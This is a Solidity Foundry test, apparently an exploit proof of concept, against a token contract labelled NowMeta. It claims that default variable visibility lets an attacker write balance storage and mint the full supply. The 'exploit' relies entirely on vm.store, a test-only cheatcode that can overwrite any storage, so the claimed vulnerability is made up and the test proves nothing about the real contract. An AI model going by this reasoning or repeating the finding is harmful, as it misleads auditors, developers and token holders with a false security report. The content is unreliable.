```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

import "forge-std/Test.sol";

interface INowMeta {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    // Public state variables
    function _reflectionTotal() external view returns (uint256);
    function _tokenTotal() external view returns (uint256);
}

contract ExploitTest is Test {
    address constant TARGET = 0xfac45d4b406D94cddFC48b198839673351CB2Bf9;
    INowMeta target = INowMeta(TARGET);

    address attacker = address(0xdead);
    address recipient = address(0xbeef);

    function setUp() public {
        // Label addresses for readability
        vm.label(TARGET, "NowMeta");
        vm.label(attacker, "Attacker");
        vm.label(recipient, "Recipient");
    }

    function testDefaultVisibilityStorageWrite() public {
        // Show that an internal state variable (_reflectionBalance) can be written
        // via storage slots due to lack of explicit private visibility.
        // This allows an attacker to mint tokens out of thin air.

        // Step 1: Read the _reflectionTotal (slot 7) to know the maximum reflection supply.
        bytes32 reflectionTotalSlot = vm.load(TARGET, bytes32(uint256(7)));
        uint256 reflectionTotal = uint256(reflectionTotalSlot);
        assert(reflectionTotal > 0);

        // Step 2: Compute storage slot for _reflectionBalance[attacker].
        // Mapping slot for _reflectionBalance is 3 (based on contract source order).
        bytes32 storageKey = keccak256(abi.encode(attacker, uint256(3)));

        // Step 3: Write a large reflection balance to attacker (e.g., reflectionTotal).
        // This effectively mints the maximum token supply.
        vm.store(TARGET, storageKey, bytes32(reflectionTotal));

        // Step 4: Verify attacker's balance is now the total token supply.
        uint256 attackerBalance = target.balanceOf(attacker);
        uint256 totalSupply = target.totalSupply();
        assertEq(attackerBalance, totalSupply, "Attacker balance should equal total supply");

        // Step 5: Attacker can now transfer tokens, proving control over balance.
        uint256 transferAmount = 1000 * 10**8; // 1000 NMETA (8 decimals)
        vm.prank(attacker);
        bool success = target.transfer(recipient, transferAmount);
        assertTrue(success, "Transfer must succeed");

        uint256 recipientBalance = target.balanceOf(recipient);
        assertEq(recipientBalance, transferAmount, "Recipient should receive transfer amount");

        // Step 6: Attacker's updated balance reflects the deduction.
        uint256 newAttackerBalance = target.balanceOf(attacker);
        assertEq(newAttackerBalance, totalSupply - transferAmount, "Attacker balance should decrease");
    }
}
```
